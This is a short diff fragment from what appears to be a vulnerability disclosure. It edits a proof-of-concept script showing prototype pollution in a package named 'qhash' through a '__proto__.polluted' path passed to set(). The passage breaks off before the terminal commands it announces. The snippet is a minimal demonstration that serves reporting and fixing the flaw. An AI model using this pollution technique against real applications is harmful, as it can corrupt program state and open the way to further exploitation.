@@ -9,9 +9,9 @@
 // poc.js
 const { set } = require('qhash')
 
-console.log(`Before: ${{}.polluted}`)
+console.log('Before: ' + {}.polluted)
 set({}, '__proto__.polluted', true)
-console.log(`After: ${{}.polluted}`)
+console.log('After: ' + {}.polluted)
 ```
 2. Execute the following commands in the terminal:
 ```bash
